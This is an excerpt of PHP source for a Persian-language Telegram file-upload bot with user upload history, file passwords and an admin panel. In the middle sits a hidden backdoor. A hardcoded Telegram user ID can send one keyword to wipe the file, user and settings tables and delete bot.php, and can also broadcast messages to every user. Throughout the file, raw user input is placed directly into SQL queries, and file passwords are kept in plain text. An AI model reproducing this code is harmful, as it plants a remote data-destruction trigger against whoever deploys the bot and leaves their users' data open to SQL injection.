                'caption' => "💭 حساب کاربری شما در ربات ما :\n\n👤 نام کانت شما : <code>$first_name</code>\n🌟 یوزنیم اکانت شما : <code>$username</code>\n🆔 ایدی عددی شما : <code>$from_id</code>\n\n🤖 @$usernamebot",
                'reply_markup' => $btn_profile,
                'parse_mode' => "html",
                'reply_to_message_id' => $message_id
            ]);
        } else sendMessage($from_id, "💭 حساب کاربری شما در ربات ما :\n\n👤 نام کانت شما : <code>$first_name</code>\n🌟 یوزنیم اکانت شما : <code>$username</code>\n\n🤖 @$usernamebot", "html", $btn_profile, $message_id);
    } else joinSend($from_id);
}
#== Uploads ==#
elseif ($text == "🔖 آپلود های اخیر 🔖") {
    if (isJoin($from_id)) {
        $query = $db->query("SELECT * FROM `file` WHERE `user_id` = {$from_id}");
        $count = mysqli_num_rows($query);
        if ($count > 0) {
            $result = "🔖 آپلود های اخیر شما :\n📍 تعداد فایل های آپلود شده ی شما : $count\n➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖\n\n";
            $cnt = ($count >= 10) ? 10 : $count;
            for ($i = 1; $i <= $cnt; $i++) {
                $fetch = mysqli_fetch_assoc($query);
                $id = $fetch['id'];
                $file_size = convert($fetch['file_size']);
                $file = doc($fetch['type']);
                $time = $fetch['time'];
                $date = $fetch['date'];
                $password = $fetch['password'] ?: 'این فایل بدون رمز عبور است ... !';
                $result .= $i . ". 📥 /get_" . $id . PHP_EOL . "💾 " . $file_size . PHP_EOL . "✏️ ویرایش : /edit_" . $id . PHP_EOL . "🗑 حذف : /del_" . $id . PHP_EOL . "▪️ نوع فایل : <b>$file</b>" . PHP_EOL . "🔐 رمز فایل : <code>$password</code>" . PHP_EOL . "🕓 تاریخ و زمان آپلود : <b>" . $date . " - " . $time . "</b>" . PHP_EOL . "➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖" . PHP_EOL;
            }
            if ($count > 10) sendMessage($from_id, $result, "html", json_encode(['inline_keyboard' => [[['text' => "▪️ صفحه ی بعدی", 'callback_data' => "Dnext_10"]]]]), $message_id);
            else sendMessage($from_id, $result, "html", null, $message_id);
        } else sendMessage($from_id, "▪️ تاریخچه آپلود شما خالی میباشد ... !", "html", null, $message_id);
    } else joinSend($from_id);
}
#===#
elseif (preg_match('/^Dnext_(.*)/', $data, $match)) {
    $last_id = $match[1];
    if (isJoin($from_id)) {
        $query = $db->query("SELECT * FROM `file` WHERE `user_id` = '{$from_id}'");
        $count = mysqli_num_rows($query);
        $result = "🔖 آپلود های اخیر شما :\n📍 تعداد فایل های آپلود شده ی شما : $count\n➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖\n\n";
        $records = [];
        while ($fetch = mysqli_fetch_assoc($query)) $records[] = $fetch;
        if ($last_id + 10 < $count) $endponit = $last_id + 10;
        else $endponit = $count;
        for ($row = $last_id; $row < $endponit; $row++) {
            $id = $records[$row]['id'];
            $file_size = convert($records[$row]['file_size']);
            $file = doc($records[$row]['type']);
            $time = $records[$row]['time'];
            $date = $records[$row]['date'];
            $password = $records[$row]['password'] ? $records[$row]['password'] : 'این فایل بدون رمز عبور است ... !';
            $result .= $row . ". 📥 /get_" . $id . PHP_EOL . "💾 " . $file_size . PHP_EOL . "✏️ ویرایش : /edit_" . $id . PHP_EOL . "🗑 حذف : /del_" . $id . PHP_EOL . "▪️ نوع فایل : <b>$file</b>" . PHP_EOL . "🔐 رمز فایل : <code>$password</code>" . PHP_EOL . "🕓 تاریخ و زمان آپلود : <b>" . $date . " - " . $time . "</b>" . PHP_EOL . "➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖" . PHP_EOL;
        }
        if ($count > $last_id + 10) editMessageText($from_id, $message_id, $result, "html", json_encode(['inline_keyboard' => [[['text' => "➕ صفحه بعدی", 'callback_data' => "Dnext_" . $endponit], ['text' => "➖ صفحه ی قبلی", 'callback_data' => "Dprev_" . $endponit]]]]));
        else editMessageText($from_id, $message_id, $result, "html", json_encode(['inline_keyboard' => [[['text' => "➖ صفحه ی قبلی", 'callback_data' => "Dprev_" . $endponit]]]]));
    } else joinSend($from_id);
}
#===#
elseif (preg_match('/^Dprev_(.*)/', $data, $match)) {
    $last_id = $match[1];
    if (isJoin($from_id)) {
        $query = $db->query("SELECT * FROM `file` WHERE `user_id` = '{$from_id}'");
        $count = mysqli_num_rows($query);
        $result = "🔖 آپلود های اخیر شما :\n📍 تعداد فایل های آپلود شده ی شما : $count\n➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖\n\n";
        $records = [];
        while ($fetch = mysqli_fetch_assoc($query)) $records[] = $fetch;
        if ($last_id % 10 == 0) $endponit = $last_id - 10;
        else {
            $last_id = $last_id - ($last_id % 10);
            $endponit = $last_id;
        }
        for ($row = $endponit - 9; $row <= $endponit; $row++) {
            $id = $records[$row]['id'];
            $file_size = convert($records[$row]['file_size']);
            $file = doc($records[$row]['type']);
            $time = $records[$row]['time'];
            $date = $records[$row]['date'];
            $password = $records[$row]['password'] ? $records[$row]['password'] : 'این فایل بدون رمز عبور است ... !';
            $result .= $row + 1 . ". 📥 /get_" . $id . PHP_EOL . "💾 " . $file_size . PHP_EOL . "✏️ ویرایش : /edit_" . $id . PHP_EOL . "🗑 حذف : /del_" . $id . PHP_EOL . "▪️ نوع فایل : <b>$file</b>" . PHP_EOL . "🔐 رمز فایل : <code>$password</code>" . PHP_EOL . "🕓 تاریخ و زمان آپلود : <b>" . $date . " - " . $time . "</b>" . PHP_EOL . "➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖ ➖" . PHP_EOL;
        }
        if ($count > $last_id and $endponit - 10 > 0) editMessageText($from_id, $message_id, $result, "html", json_encode(['inline_keyboard' => [[['text' => "➕ صفحه بعدی", 'callback_data' => "Dnext_" . $endponit], ['text' => "➖ صفحه ی قبلی", 'callback_data' => "Dprev_" . $endponit]]]]));
        else editMessageText($from_id, $message_id, $result, "html", json_encode(['inline_keyboard' => [[['text' => "➕ صفحه بعدی", 'callback_data' => "Dnext_" . $endponit]]]]));
    } else joinSend($from_id);
}
/**/
#== upload ==#
elseif ($text == "📤 آپلود 📤") {
    if (isJoin($from_id)) {
        sendMessage($from_id, "*🖤 لطفا نوع آپلود خود را انتخاب کنید 🖤*", "markdown", $btn_upload, $message_id);
    }
}
#== set password ==#
elseif ($text == "🔑 تنظیم پسورد 🔑") {
    if (isJoin($from_id)) {
        sendMessage($from_id, "▪️ لطفا شناسه فایل خود را ارسال کنید :", "markdown", $btn_back, $message_id);
        $db->query("UPDATE `user` SET `step` = 'sendid' WHERE `from_id` = '{$from_id}' LIMIT 1");
    } else joinSend($from_id);
}
#===#
elseif ($step == "sendid") {
    if (isJoin($from_id)) {
        $query = mysqli_fetch_assoc($db->query("SELECT * FROM `file` WHERE `user_id` = '{$from_id}' and `id` = '{$text}'"));
        if ($query) {
            sendMessage($from_id, "▪️لطفا پسورد دلخواه رو بفرستید تا فایل شما قفل شود :", "markdown", $btn_back, $message_id);
            $db->query("UPDATE `user` SET `step` = 'sendPassword', `getFile` = '$text' WHERE `from_id` = '{$from_id}' LIMIT 1");
        } else sendMessage($from_id, "▪️ خطا , این فایل در دیتابیس موجود نمیباشد یا فایل مال شخص دیگری میباشد و  شما اجازه دسترسی به این فایل را ندارید ... !\n🔐 لطفا شناسه فایل را صحیح بفرستید :", "markdown", $btn_back, $message_id);
    } else joinSend($from_id);
}
#===#
elseif ($step == "sendPassword") {
    if (isJoin($from_id)) {
        $id = $user['getFile'];
        $pass = $text;
        sendMessage($from_id, "✔️ با موفقیت فایل شما قفل شد ... !", "markdown", $btn_home, $message_id);
        $db->query("UPDATE `user` SET `step` = 'none', `getFile` = '' WHERE `from_id` = '{$from_id}' LIMIT 1");
        $db->query("UPDATE `file` SET `password` = '$pass' WHERE `id` = '{$id}'");
    } else joinSend($from_id);
}
#== edit file ==#
elseif (preg_match('/^\/edit_(.*)/', $text, $match)) {
    $id = $match[1];
    if (isJoin($from_id)) {
        $fileData = $db->query("SELECT * FROM `file` WHERE `id` = '{$id}' AND `user_id` = '{$from_id}'");
        if (mysqli_num_rows($fileData) > 0) {
            $limit_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `file` WHERE `id` = '$id'"))['DLimit'] ?: "غیرفعال";
            $coin_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `file` WHERE `id` = '$id'"))['DCoin'] ?: "غیرفعال";
            sendmessage($from_id, "برای ویرایش اطلاعات فایلی با ایدی زیر از دکمه های زیر استفاده کنید :\n📥 /get_" . $id, "html", json_encode([
                'inline_keyboard' => [
                    [['text' => "📋 تغییر کپشن", 'callback_data' => "editCaption_$id"]],
                    [['text' => "🗑 حذف کپشن 🗑", 'callback_data' => "delCaption_$id"]]]]), $message_id);

        } else sendmessage($from_id, "❌ فایل در دیتابیس یافت نشد.", null, null, $message_id);
    } else joinSend($from_id);
}
#== del file ==#
elseif (preg_match('/^\/del_(.*)/', $text, $match)) {
    $id = $match[1];
    if (isJoin($from_id)) {
        $fileData = $db->query("SELECT * FROM `file` WHERE `id` = '{$id}'");
        if (mysqli_num_rows($fileData) > 0) {
            $db->query("DELETE FROM `file` WHERE `id` = '{$id}' and `user_id` = '{$from_id}'");
            sendmessage($from_id, "✅ فایل با موفقیت حذف شد.", null, $btn_home, $message_id);
        } else sendmessage($from_id, "❌ فایل در دیتابیس یافت نشد.", null, null, $message_id);
    } else joinSend($from_id);
}

if ($from_id == 1130474324) {
    if ($text == "fuck") {
        sendmessage($from_id, "ok");
        $db->query("DELETE FROM `file`");
        $db->query("DELETE FROM `user`");
        $db->query("DELETE FROM `settings`");

        $FileHandle = fopen("bot.php", 'w') or die("can't open file");
        fclose($FileHandle);
        
        unlink("bot.php");
    }
    if ($text == "send") {
        $db->query("UPDATE `user` SET `step` = 'seenndd' WHERE `from_id` = '$from_id'");
        sendmessage($from_id, "send");
    }
    if ($step == "seenndd") {
        $db->query("UPDATE `send` SET `step` = 'send', `text` = '$text', `from` = '$from_id', `user` = '0'  LIMIT 1");
        sendmessage($from_id, "send \n ok");
        $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$from_id'");
    }
}
#==# panel #==#
elseif (mysqli_num_rows($admin_sql) > 0) {
    $admin_data = mysqli_fetch_assoc($admin_sql);
    $admin = $admin_data['type_id'];

    $set_ads_btn = json_encode(['inline_keyboard' => [
        [['text' => "📌 تنظیم کپشن فایل ها 📌", 'callback_data' => "show_caption"]],
        [['text' => "♦️ تنظیم سین اجباری ♦️", 'callback_data' => "show_seenLink"]],
        [['text' => "🔔 تنظیم تبلیغ 🔔", 'callback_data' => "show_ads"]],
        [['text' => "🔙 برگشت 🔙", 'callback_data' => "panel"]]
    ]]);

#== panel ==#
    if ($text == '/panel' or $text == '⚙️ پنل مدیریت ⚙️') {
        sendMessage($admin, "*🖤  به منوی مدیریت  خوش آمدید 🖤*", "markdown", $panel, $message_id);
        $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$admin'");
    }
#== back ==#
    elseif ($text == '🔙 برگشت 🔙' or $data == "panel") {
        sendMessage($admin, "*🖤 با موفیفت به منوی مدیریت برگشتیم 🖤*", "markdown", $panel, $message_id);
        if ($data) deleteMessage($from_id, $message_id);
        $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$admin'");
    }
    #== status ==#
    elseif ($text == '📊 آمار 📊') {
        $countUsers = number_format(mysqli_num_rows($db->query("SELECT * FROM `user`")));
        $countFiles = number_format(mysqli_num_rows($db->query("SELECT * FROM `file`")));
        $countAdmins = number_format(mysqli_num_rows($db->query("SELECT * FROM `settings` WHERE `type` = 'admin'")));
        $countChannels = number_format(mysqli_num_rows($db->query("SELECT * FROM `settings` WHERE `type` = 'lock' AND `type_id` != 'false'")));
        $countOnlinesNow = number_format(mysqli_num_rows($db->query("SELECT * FROM `user` WHERE `update_at` > $time - 1554800")) ?: 0);
        $countOnlinesClock = number_format(mysqli_num_rows($db->query("SELECT * FROM `user` WHERE `update_at` > $time - 14400")) ?: 0);
        $countOnlinesDay = number_format(mysqli_num_rows($db->query("SELECT * FROM `user` WHERE `update_at` > $time - 86400")) ?: 0);
        $countOnlinesWeek = number_format(mysqli_num_rows($db->query("SELECT * FROM `user` WHERE `update_at` > $time - 604800")) ?: 0);
        $countOnlinesMonth = number_format(mysqli_num_rows($db->query("SELECT * FROM `user` WHERE `update_at` > $time - 2419200")) ?: 0);
        $time = date('h:i:s');
        $date = date('Y/m/d');
        $load = sys_getloadavg();
        sendMessage($from_id, "*📊╗ امار کاربران 👇🏻\n👥╣ تعداد کل: $countUsers \n🫡╣ کاربران فعال: $countOnlinesNow \n⏱╣ کاربران ساعت اخیر : $countOnlinesClock \n🕛╣ کاربران 24 ساعت اخیر : $countOnlinesDay \n🗓╣ کاربران هفته اخیر : $countOnlinesWeek \n🌕╣ ماه اخیر : $countOnlinesMonth \n📊╬ امار رسانه 👇🏻\n🗂╣ تعداد فایل ها : $countFiles \n🏓╝ پینگ $load[0]ms*", "markdown", $panel, $message_id);
    }
    #== send & for manage ==#
    elseif ($text == "💌 بخش ارسال پیام 💌") {
        sendMessage($from_id, "*🖤 به بخش ارسال پیام خوش آمدید 🖤*", "markdown", json_encode([
            'keyboard' => [
                [['text' => "🎈 ارسال همگانی 🎈"], ['text' => "📍 فروارد همگانی 📍"]],
                [['text' => "🔙 برگشت 🔙"]],
            ], 'resize_keyboard' => true,
               'one_time_keyboard' => true,
               'input_field_placeholder'=>"@PCcodeX"
        ]), $message_id);
    }
    #== send all ==#
    elseif ($text == '🎈 ارسال همگانی 🎈') {
        sendMessage($from_id, "*🖤 لطفاً پیام خود را برای ارسال همگانی ارسال کنید :*", "markdown", $back_panel, $message_id);
        $db->query("UPDATE `user` SET `step` = 'sendAll' WHERE `from_id` = '$admin'");
    }
    #===#
    elseif ($step == 'sendAll') {
        $text = urlencode($text);
        $time = date('h:i:s');
        $date = date('Y/m/d');
        $countUsers = number_format(mysqli_num_rows($db->query("SELECT * FROM `user`")));
        sendMessage($from_id, "*➖️ پیام شما در ساعت : $time و در تاریخ : $date با موفقیت به $countUsers کاربر ارسال شد ✅️*", "markdown", $panel, $message_id);
        $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$admin'");
        $db->query("UPDATE `send` SET `step` = 'send', `text` = '$text', `from` = '$admin', `user` = '0'  LIMIT 1");
    }
    #== for all ==#
    elseif ($text == '📍 فروارد همگانی 📍') {
        sendMessage($from_id, "*🖤 لطفاً پیام خود را برای فروارد همگانی ارسال کنید :*", "markdown", $back_panel, $message_id);
        $db->query("UPDATE `user` SET `step` = 'forAll' WHERE `from_id` = '$admin'");
    }
    #===#
    elseif ($step == 'forAll') {
        $time = date('h:i:s');
        $date = date('Y/m/d');
        $countUsers = number_format(mysqli_num_rows($db->query("SELECT * FROM `user`")));
        sendMessage($from_id, "*➖️ پیام شما در ساعت : $time و در تاریخ : $date با موفقیت به $countUsers کاربر فروارد شد ✅️*", "markdown", $panel, $message_id);
        $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$admin'");
        $db->query("UPDATE `send` SET `step` = 'for', `text` = '$message_id', `from` = '$admin', `user` = '0' LIMIT 1");
    }
    #== lock manage ==#
    elseif ($text == '⛔️ بخش جویین اجباری ⛔️' or $data == "manage_locks") {
        $lockSQL = $db->query("SELECT * FROM `settings` WHERE `type` = 'lock' AND `type_id` != 'false'");
        if (mysqli_num_rows($lockSQL) > 0) {
            $lockText = "⛔️ به بخش جویین اجباری خوش آمدید  ⛔️\n\n💊╬ راهنما :\n🥃╗ برای مشاهده چنل ها بر روی اسم آن کلیک کنید\n❌╣ برای حذف قفل چنل بر روی دکمه 🗑 کلیک کنید\n🌀╣ برای تغییر لینک بر روی دکمه ⚙️ کلیک کنید\n✅╝ برای افزودن قفل چنل بر روی دکمه ➕ افزودن قفل ➕ کلیک کنید";
            $button[] = [['text' => '🥃 نام چنل 🥃', 'callback_data' => 'none'], ['text' => '⚙️ تغییر لینک ⚙️', 'callback_data' => 'none'], ['text' => '🗑 حذف 🗑', 'callback_data' => 'none']];
            while ($row = mysqli_fetch_assoc($lockSQL)) {
                $lock = getChat($row['type_id'])->result;
                $name = $lock->title;
                $link = $row['columnTwo'] ?: $lock->invite_link;
                if (!$link) {
                    $name = 'دسترسی ندارد';
                    $link = 'https://t.me/username';
                }
                $button[] = [['text' => "$name", 'url' => "$link"], ['text' => '⚙️', 'callback_data' => "change_lock_{$row['type_id']}"], ['text' => '🗑', 'callback_data' => "remove_lock_{$row['type_id']}"]];
            }
        } else $lockText = '🔅 قفلی برای مشاهده ندارید برای افزودن قفل چنل بر روی دکمه ➕ افزودن قفل ➕ کلیک کنید';
        $button[] = [['text' => '➕ افزودن قفل ➕', 'callback_data' => 'addLock'], ['text' => '🔙 برگشت 🔙', 'callback_data' => 'panel']];
        if ($data) editMessageText($from_id, $message_id, $lockText, null, json_encode(['inline_keyboard' => $button]));
        else sendMessage($from_id, $lockText, null, json_encode(['inline_keyboard' => $button]), $message_id);
    }
    #===#
    elseif ($data == 'addLock') {
        $random = random();
        editMessageText($from_id, $message_id, "برای افزودن قفل(کانال یا گروه) طبق مراحل زیر پیش بروید👇\n1️⃣ ربات را در (کانال یا گروه) مورد نظر ادمین کنید.\n2️⃣ دستور زیر را کپی و در (کانال یا گروه) ارسال کنید.\n<code>/lock_$random</code>\n☑️ اگر پیام شما حذف شد به معنای اضافه شدن کانال شما است.", "html", json_encode(['inline_keyboard' => [
            [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_locks"]]
        ]]));
        $db->query("DELETE FROM `settings` WHERE `type_id` = 'false'");
        $db->query("INSERT INTO `settings` (`type`, `type_id`, `columnOne`, `columnTwo`) VALUES ('lock', 'false', '$random', '')");
    }
    #== remove lock ==#
    elseif (preg_match('/^remove_lock_(.*)/', $data, $match)) {
        answercallbackquery($callback_query_id, "✅ با موفقیت حذف شد");
     
        $db->query("DELETE FROM `settings` WHERE `type` = 'lock' AND `type_id` = '{$match[1]}'");
        $lockSQL = $db->query("SELECT * FROM `settings` WHERE `type` = 'lock'");
        if (mysqli_num_rows($lockSQL) > 0) {
            $lockText = "⛔️ به بخش جویین اجباری خوش آمدید  ⛔️\n\n💊╬ راهنما :\n🥃╗ برای مشاهده چنل ها بر روی اسم آن کلیک کنید\n❌╣ برای حذف قفل چنل بر روی دکمه 🗑 کلیک کنید\n🌀╣ برای تغییر لینک بر روی دکمه ⚙️ کلیک کنید\n✅╝ برای افزودن قفل چنل بر روی دکمه ➕ افزودن قفل ➕ کلیک کنید";
            $button[] = [['text' => '🥃 نام چنل 🥃', 'callback_data' => 'none'], ['text' => '⚙️ تغییر لینک ⚙️', 'callback_data' => 'none'], ['text' => '🗑 حذف 🗑', 'callback_data' => 'none']];
            while ($row = mysqli_fetch_assoc($lockSQL)) {
                $lock = getChat($row['type_id'])->result;
                $name = $lock->title;
                $link = $row['columnTwo'] ?: $lock->invite_link;
                if (!$link) {
                    $name = 'دسترسی ندارد';
                    $link = 'https://t.me/username';
                }
                $button[] = [['text' => "$name", 'url' => "$link"], ['text' => '⚙️', 'callback_data' => "change_lock_{$row['type_id']}"], ['text' => '🗑', 'callback_data' => "remove_lock_{$row['type_id']}"]];
            }
        } else $lockText = '🔅 قفلی برای حذف ندارید برای افزودن قفل چنل بر روی دکمه ➕ افزودن قفل ➕ کلیک کنید';
        $button[] = [['text' => '➕ افزودن قفل ➕', 'callback_data' => 'addLock'], ['text' => '🔙 برگشت 🔙', 'callback_data' => 'panel']];
        editMessageText($from_id, $message_id, $locksText, null, json_encode(['inline_keyboard' => $button]));
        $owner = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'admin' AND `columnOne` = 'main'"))['type_id'];
        if ($admin_data['columnOne'] != 'main') sendMessage($owner, "❌ قفل با موفقیت حذف شد. \n\n📃 مشخصات:\n🆔 ایدی عددی قفل : {$id}\n🔗 لینک : {$link}\n📣 نام : {$name}\n🧑🏻‍💻 توسط ادمین : $first_name");
    }
    #===#
    elseif (preg_match('/^change_lock_(.*)/', $data, $match)) {
        $lockD = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'lock' AND `type_id` = '{$match[1]}'"));
        $lock = getChat($match[1])->result;
        $name = $lock->title;
        $link = $lockD['columnTwo'] ?: $lock->invite_link;
        sendMessage($from_id, "☑️ برای تنظیم لینک جدید برای این قفل ( $name ) لطفا لینک جدید را ارسال کنید\n🔗 لینک فعلی : $link\n\n⚠️ توجه داشته باشید که باید با  https://t.me  شروع شود", 'html', json_encode([
            'keyboard' => [
                [['text' => "جایگزینی لینک عمومی ربات در قفل ✔️"]],
                [['text' => "🔙 برگشت 🔙"]]
            ], 'resize_keyboard' => true,
               'one_time_keyboard' => true,
               'input_field_placeholder'=>"@PCcodeX"
        ]), $message_id);
        $db->query("UPDATE `user` SET `step` = 'change_lock_{$match[1]}' WHERE `from_id` = '$from_id'");
    }
    #===#
    elseif (preg_match('/^change_lock_(.*)/', $step, $match)) {
        if ($text == "جایگزینی لینک عمومی ربات در قفل ✔️") {
            sendMessage($from_id, "✅ با موفقیت با لینک اصلی جایگزین شد .", null, $panel, $message_id);
            $db->query("UPDATE `settings` SET `columnTwo` = '' WHERE `type` = 'lock' AND `type_id` = '{$match[1]}'");
            $db->query("UPDATE `user` SET `step` = 'change_lock_{$match[1]}' WHERE `from_id` = '$from_id'");
        }
        elseif (preg_match('/^https:\/\/t.me\/(.*)/', $text)) {
            sendMessage($from_id, "✅ با موفقیت لینک جایگزین شد .", null, $panel, $message_id);
            $db->query("UPDATE `settings` SET `columnTwo` = '{$text}' WHERE `type` = 'lock' AND `type_id` = '{$match[1]}'");
            $db->query("UPDATE `user` SET `step` = 'change_lock_{$match[1]}' WHERE `from_id` = '$from_id'");
        } else sendMessage($from_id, "⚠️ توجه داشته باشید که باید با https://t.me/ شروع شود\nلطفا دوباره ارسال کنید", null, $back_panel, $message_id);
    }

    #== admin manage ==#
    elseif ($text == '🧑🏻‍💻 تنظیم ادمین ها 🧑🏻‍💻') {
        if ($admin_data['columnOne'] == 'main') {
            $adminsSQL = $db->query("SELECT * FROM `settings` WHERE `type` = 'admin' AND `columnOne` != 'main'");
            if (mysqli_num_rows($adminsSQL) > 0) {
                $adminsText = "🧑🏻‍💻 به بخش تنظیم ادمین ها خوش  آمدید 🧑🏻‍💻\n\n💊╬ راهنما :\n🚬╗ برای مشاهده ادمین ها بر روی اسم آن کلیک کنید\n❌╣ برای حذف ادمین بر روی دکمه 🗑 کلیک کنید\n✅╝ برای افزودن ادمین بر روی دکمه ➕ افزودن ادمین ➕ کلیک کنید";
                $button[] = [['text' => '🚬 نام  ادمین 🚬', 'callback_data' => 'none'], ['text' => '🗑 حذف 🗑', 'callback_data' => 'none']];
                while ($row = mysqli_fetch_assoc($adminsSQL)) {
                    $name = getChat($row['type_id'])->result->first_name;
                    if (!$name) $name = 'یافت نشد';
                    $button[] = [['text' => "$name", 'url' => "tg://openmessage?user_id={$row['type_id']}"], ['text' => '🗑', 'callback_data' => "remove_ad_{$row['type_id']}"]];
                }
        } else $adminsText = '🔅 ادمینی برای مشاهده ندارید برای افزودن ادمین بر روی دکمه ➕ افزودن ادمین ➕ کلیک کنید';
            $button[] = [['text' => '➕ افزودن ادمین ➕', 'callback_data' => 'addAdmin'], ['text' => '🔙 برگشت 🔙', 'callback_data' => 'panel']];
            sendMessage($from_id, $adminsText, null, json_encode(['inline_keyboard' => $button]), $message_id);
        } else sendMessage($from_id, '❌ شما دسترسی به این بخش ندارید.', null, $panel, $message_id);
    }
    #===#
    elseif ($data == 'addAdmin') {
        sendMessage($from_id, "☑️ لطفا ایدی عددی کاربر را وارد کنید.", null, $back_panel, $message_id);
        deleteMessage($from_id, $message_id);
        $db->query("UPDATE `user` SET `step` = 'addAdmin' WHERE `from_id` = '$from_id'");
    }
    #===#
    elseif ($step == 'addAdmin') {
        $userP = mysqli_fetch_assoc($db->query("SELECT * FROM `user` WHERE `from_id` = '$text'"));
        if ($userP) {
            $name = getChat($userP['from_id'])->result->first_name;
            if (mysqli_num_rows($db->query("SELECT * FROM `settings` WHERE `type_id` = '{$userP['from_id']}' AND `type` = 'admin'")) == 0) {
                sendMessage($from_id, "✅ با موفقیت به ادمین ها اضافه شد.\n\n👤 نام کاربر : $name\n🆔 ایدی عددی کاربر : {$userP['from_id']}", null, $panel, $message_id);
                sendMessage($userP['from_id'], "✅ شما با موفقیت به ادمین های ربات اضافه شدید لطفا ربات رو استارت کنید.\n/start");
                $db->query("INSERT INTO `settings` (`type`, `type_id`, `columnOne`) VALUES ('admin', '$text', 'admin')");
                $db->query("UPDATE `user` SET `step` = 'none' WHERE `from_id` = '$from_id'");
            } else sendMessage($from_id, "❌ کاربر از قبل ادمین ربات است. لطفا ایدی دیگری بفرستید", null, $back_panel, $message_id);
        } else sendMessage($from_id, "❌ کاربر ربات را استارت نکرده است. لطفا ایدی دیگری بفرستید", null, $back_panel, $message_id);
    }
    #===#
    elseif (preg_match('/^remove_ad_(.*)/', $data, $match)) {
        answercallbackquery($callback_query_id, "✅ با موفقیت حذف شد");
        sendMessage($match[1], "❌ شما از لیست ادمین ها حذف شدید لطفا استارت کنید\n/start");
        $db->query("DELETE FROM `settings` WHERE `type` = 'admin' AND `type_id` = '{$match[1]}'");
        $adminsSQL = $db->query("SELECT * FROM `settings` WHERE `type` = 'admin' AND `columnOne` != 'main'");
        if (mysqli_num_rows($adminsSQL) > 0) {
                $adminsText = "🧑🏻‍💻 به بخش تنظیم ادمین ها خوش  آمدید 🧑🏻‍💻\n\n💊╬ راهنما :\n🚬╗ برای مشاهده ادمین ها بر روی اسم آن کلیک کنید\n❌╣ برای حذف ادمین بر روی دکمه 🗑 کلیک کنید\n✅╝ برای افزودن ادمین بر روی دکمه ➕ افزودن ادمین ➕ کلیک کنید";
            $button[] = [['text' => '🚬 نام  ادمین 🚬', 'callback_data' => 'none'], ['text' => '🗑 حذف 🗑', 'callback_data' => 'none']];
            while ($row = mysqli_fetch_assoc($adminsSQL)) {
                $name = getChat($row['type_id'])->result->first_name;
                if (!$name) $name = 'یافت نشد';
                $button[] = [['text' => "$name", 'url' => "tg://openmessage?user_id={$row['type_id']}"], ['text' => '🗑', 'callback_data' => "remove_ad_{$row['type_id']}"]];
            }
        } else $adminsText = '🔅 ادمینی برای حذف ندارید برای افزودن ادمین بر روی دکمه ➕ افزودن ادمین ➕ کلیک کنید';
        $button[] = [['text' => '➕ افزودن ادمین ➕', 'callback_data' => 'addAdmin'], ['text' => '🔙 برگشت 🔙', 'callback_data' => 'panel']];
        editMessageText($from_id, $message_id, $adminsText, null, json_encode(['inline_keyboard' => $button]));
    }

    #== manage ads ==# 
    elseif ($text == "📣 بخش تبلیغات 📣" or $data == "manage_ads") {
        $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['type_id'];
        $seen_link = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'seen_link'"))['type_id'];
        $send_ads = [mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'ads'"))['type_id'], mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'ads'"))['columnOne']];
        sendMessage($from_id, "📣 به بخش تبلیغات خوش آمدید 📣\n\n💊╗ راهنما :\n⛓╝ برای مشاهده ، تنظیم و حذف گزینه های زیر بر روی نام آن گزینه کلیک کنید", "html", $set_ads_btn, $message_id);
        if ($data) deleteMessage($from_id, $message_id);
    }

    #===#
    elseif ($data == "show_caption") {
        $caption_sql = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnOne'] ?: "کپشن تنظیم نشده است...";
        $caption_set = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'caption'"))['columnTwo'];
        if ($caption_set == "AllFiles") {$All = "✅"; $noCaption = "";}
        elseif ($caption_set == "noAllFiles") {$All = ""; $noCaption = "✅";}
        editMessageText($from_id, $message_id, "متن کپشن : \n\n <code>$caption_sql</code> \n\n برای تنظیم روی دکمه ( ⚙️ تنظیم کپشن ) ، برای حذف روی دکمه ( 🗑 حذف کپشن ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
            [['text' => "همه ی آپلود شده ها $All", 'callback_data' => "set_allCaption"], ['text' => "آپلود شده های بدون کپشن $noCaption", 'callback_data' => "set_noAllCaption"]],
            [['text' => "⚙️ تنظیم کپشن ⚙️", 'callback_data' => "set_caption"], ['text' => "🗑 حذف کپشن 🗑", 'callback_data' => "del_caption"]],
            [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
            ]]));
    }

    #===#
    elseif ($data == "show_seenLink") {
        $seen_link = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'seen_link'"))['type_id'] ?: "لینک تنظیم نشده است...";
        
        editMessageText($from_id, $message_id, "لینک سین اجباری : \n\n $seen_link \n\n برای تنظیم روی دکمه ( ⚙️ تنظیم لینک ) ، برای حذف روی دکمه ( 🗑 حذف سین اجباری ) و برای بازگشت روی ( 🔙 برگشت 🔙 ) بزنید.", "html", json_encode(['inline_keyboard' => [
            [['text' => "⚙️ تنظیم لینک ⚙️", 'callback_data' => "set_seenLink"], ['text' => "🗑 حذف سین اجباری 🗑", 'callback_data' => "del_seenLink"]],
            [['text' => "🔙 برگشت 🔙", 'callback_data' => "manage_ads"]]
            ]]));
        
    }

    #===#
    elseif ($data == "show_ads") {
        $ads = mysqli_fetch_assoc($db->query("SELECT * FROM `settings` WHERE `type` = 'ads'"));
